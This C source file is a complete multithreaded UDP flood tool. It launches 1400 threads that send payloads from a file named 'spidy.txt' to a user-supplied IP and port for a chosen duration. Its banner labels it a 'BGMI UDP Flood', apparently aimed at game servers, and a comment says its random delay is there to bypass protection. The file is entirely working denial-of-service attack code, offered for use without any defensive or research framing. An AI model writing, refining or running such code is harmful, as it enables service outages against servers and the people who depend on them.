#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <time.h>

#define THREADS 1400
#define MAX_PAYLOADS 2048
#define MAX_PAYLOAD_SIZE 512

char *payloads[MAX_PAYLOADS];
int payload_lengths[MAX_PAYLOADS];
int payload_count = 0;

char target_ip[64];
int target_port;
int duration;

void load_payloads() {
    FILE *fp = fopen("spidy.txt", "r");
    if (!fp) {
        perror("spidy.txt open failed");
        exit(1);
    }

    char line[1024];
    while (fgets(line, sizeof(line), fp)) {
        if (payload_count >= MAX_PAYLOADS) break;
        char *decoded = malloc(MAX_PAYLOAD_SIZE);
        int i = 0;
        char *token = strtok(line, "\\x");
        while (token) {
            if (strlen(token) >= 2) {
                unsigned int byte;
                sscanf(token, "%2x", &byte);
                decoded[i++] = (char)byte;
            }
            token = strtok(NULL, "\\x");
        }
        payloads[payload_count] = decoded;
        payload_lengths[payload_count++] = i;
    }

    fclose(fp);

    if (payload_count == 0) {
        printf("No payloads loaded. spidy.txt empty or wrong format.\n");
        exit(1);
    }
}

void *flood(void *arg) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) pthread_exit(0);

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(target_port);
    addr.sin_addr.s_addr = inet_addr(target_ip);

    time_t end = time(NULL) + duration;

    while (time(NULL) < end) {
        int i = rand() % payload_count;
        sendto(sock, payloads[i], payload_lengths[i], 0, (struct sockaddr *)&addr, sizeof(addr));
        usleep(rand() % 1000); // Random delay to bypass protection
    }

    close(sock);
    pthread_exit(0);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <IP> <PORT> <TIME>\n", argv[0]);
        return 1;
    }

    strncpy(target_ip, argv[1], sizeof(target_ip));
    target_port = atoi(argv[2]);
    duration = atoi(argv[3]);

    load_payloads();
    srand(time(NULL));

    printf("[*] BGMI UDP Flood: %s:%d for %d sec with %d threads\n", target_ip, target_port, duration, THREADS);

    pthread_t threads[THREADS];

    for (int i = 0; i < THREADS; i++) {
        pthread_create(&threads[i], NULL, flood, NULL);
        usleep(500);
    }

    for (int i = 0; i < THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("[+] Attack finished!\n");
    return 0;
}
